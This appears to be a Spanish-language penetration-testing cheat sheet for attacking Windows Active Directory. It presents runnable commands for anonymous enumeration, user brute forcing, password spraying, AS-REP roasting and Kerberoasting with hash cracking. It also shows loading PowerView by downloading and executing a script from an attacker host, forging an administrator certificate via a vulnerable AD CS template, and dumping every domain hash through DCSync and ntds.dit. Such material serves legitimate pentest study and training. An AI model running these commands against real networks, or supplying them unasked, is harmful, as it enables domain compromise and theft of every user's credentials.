---
icon: windows
---

# Enumeración

### 1. Identificación Inicial sin credenciales

_Objetivo: Identificar el Controlador de Dominio (DC), el nombre del dominio y posibles vectores de entrada anónimos._

#### Reconocimiento de Red

Descubrir IPs y puertos clave (53, 88, 135, 139, 389, 445, 636).

```bash
# Escaneo rápido de puertos AD comunes
nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 <IP_Rango>

# Identificar nombre de dominio y DC por NetBIOS/SMB
nxc smb <IP_DC>
enum4linux-ng -U <IP_DC>
```

#### Enumeración Anónima / Null Session

Intentar listar usuarios o recursos sin contraseña.

```bash
# LDAP Anónimo (listar todo el directorio si es posible)
ldapsearch -x -H ldap://<IP_DC> -b "DC=empresa,DC=local"

# Enumeración SMB (Null Session)
smbclient -L //<IP_DC> -N

# RPC Client (Null Session - intentar conectar sin usuario)
rpcclient -U "" <IP_DC> -N
> enumdomusers       # Listar usuarios
> querydominfo       # Info del dominio
```

#### User Hunting (RID Cycling)

Si no tenemos usuarios, intentamos descubrirlos mediante fuerza bruta de IDs.

```
# Usando Kerbrute (Validar usuarios existentes sin bloquear cuentas)
kerbrute userenum --dc <IP_DC> -d <dominio.local> users_list.txt

# Usando NetExec (RID Brute force)
nxc smb <IP_DC> -u "guest" -p "" --rid-brute 10000
```

### 2. Validación de Credenciales & Password Spraying

_Objetivo: Conseguir un usuario válido para realizar enumeración autenticada._

{% hint style="warning" %}
El Password Spraying puede bloquear cuentas
{% endhint %}

```bash
# Obtener política de contraseñas (para ver intentos fallidos permitidos)
nxc smb <IP_DC> -u "usuario" -p "password" --pass-pol

# Password Spraying (Probar 1 password contra muchos usuarios)
nxc smb <IP_DC> -u users.txt -p "Summer2023!" --continue-on-success

# AS-REP Roasting (Usuarios que no requieren pre-autenticación Kerberos)
# ¡Esto puede darte un hash sin tener credenciales previas!
impacket-GetNPUsers <dominio>/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

### 3. Enumeración estando autenticado

Teniendo un usuario/password comprometido, mapear la estructura completa del AD. Herramientas: Impacket, NetExec, Windapsearch.

#### Enumeración Básica de Usuarios y Grupos

```bash
# Listar todos los usuarios del dominio con descripciones (útil para encontrar passwords en comentarios)
nxc smb <IP_DC> -u <user> -p <pass> --users

# Listar grupos del dominio
nxc smb <IP_DC> -u <user> -p <pass> --groups

# Buscar usuarios Administradores de Dominio
impacket-lookupsid <dominio>/<user>:<pass>@<IP_DC> | grep "Domain Admins"
```

#### Búsqueda de SPNs (Kerberoasting)

Técnica crítica. Buscar cuentas de servicio para crackear sus hashes TGS.

```bash
# Solicitar TGS para cuentas con SPN
impacket-GetUserSPNs <dominio>/<user>:<pass> -request -outputfile hashes.kerberoast

# Crackear con Hashcat
hashcat -m 13100 hashes.kerberoast wordlist.txt
```

***

### 4. Enumeración Profunda (Desde Windows / PowerShell)

Si tienes acceso a una máquina en el dominio, usa herramientas nativas o scripts de PowerShell. Herramientas: PowerView (PowerSploit), ADModule.

#### Cargar PowerView en memoria

```powershell
 PS> IEX(New-Object Net.WebClient).DownloadString('http://<IP_Atacante>/PowerView.ps1')
```

#### Enumeración de Usuarios y Grupos (PowerView)

```powershell
# Información básica del usuario actual
Get-NetUser

# Buscar un usuario específico
Get-NetUser -Identity "admin_user"

# Listar miembros del grupo Domain Admins
Get-NetGroupMember -Identity "Domain Admins"

# Listar todos los ordenadores del dominio
Get-NetComputer
```

#### Enumeración de Permisos y ACLs

Buscar quién puede modificar a quién (ej. Reset Password, WriteDacl).

```powershell
# Ver ACLs de un objeto específico
Get-ObjectAcl -Identity "Administrator" -ResolveGUIDs

# Buscar GPOs (Políticas de Grupo) interesantes
Get-NetGPO | select displayname, whenchanged

# Buscar computadoras donde soy Admin Local (Derivada de GPO/Grupos)
Find-LocalAdminAccess
```

#### Búsqueda de Shares y Archivos

Buscar archivos con contraseñas (web.config, scripts, txt).

PowerShell

```powershell
# Buscar shares legibles en la red
Invoke-ShareFinder -CheckShareAccess

# Buscar archivos con "pass" o "secret" en el nombre
Invoke-FileFinder -Pattern "pass"
```

***

### 5. Mapeo Visual de Rutas de Ataque (BloodHound)

Automatizar el descubrimiento de relaciones complejas (quién es admin de qué). Herramienta Definitiva: BloodHound.

#### Recolección de Datos (Ingestor)

Opción A: Desde Linux (Python - no requiere unirse al dominio)

```bash
# Recolectar datos (All: usuarios, grupos, sesiones, trusts, etc.)
bloodhound-python -u <user> -p <pass> -ns <IP_DC> -d <dominio> -c All
```

Opción B: Desde Windows (SharpHound.exe)

```powershell
# Ejecutar SharpHound
.\SharpHound.exe --CollectionMethods All
```

#### Análisis&#x20;

Cargar el .zip generado y ejecutar queries predefinidas:

1. Find Principals with DCSync Rights: Quién puede volcar hashes del dominio.
2. Shortest Paths to Domain Admins: La ruta más rápida para ser DA.
3. Find Workstations where Domain Users can RDP: Dónde podemos movernos lateralmente.

### 6. Active Directory Certificate Services (AD CS)

Objetivo: Explotar infraestructuras de PKI mal configuradas (ESC1 - ESC8). Herramienta: Certipy.

```bash
# Enumerar plantillas de certificados vulnerables
certipy find -u <user>@<dominio> -p <pass> -dc-ip <IP_DC> -vulnerable

# Si encuentras vulnerabilidad (ej. ESC1), solicitar certificado
certipy req -u <user>@<dominio> -p <pass> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<dominio>

# Autenticarse con el certificado para obtener hash NTLM
certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
```

### 7. Post-Explotación de Dominio (Dumping)

Una vez eres Domain Admin, extraer todo.



```bash
# DCSync (Volcar todos los hashes del dominio - Requiere ser DA o tener privilegios DCSync)
impacket-secretsdump <dominio>/<admin_user>:<pass>@<IP_DC>

# Volcar ntds.dit (base de datos de AD)
# 1. Crear Shadow Copy (vssadmin)
# 2. Copiar ntds.dit y SYSTEM registry
# 3. Extraer offline con impacket
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
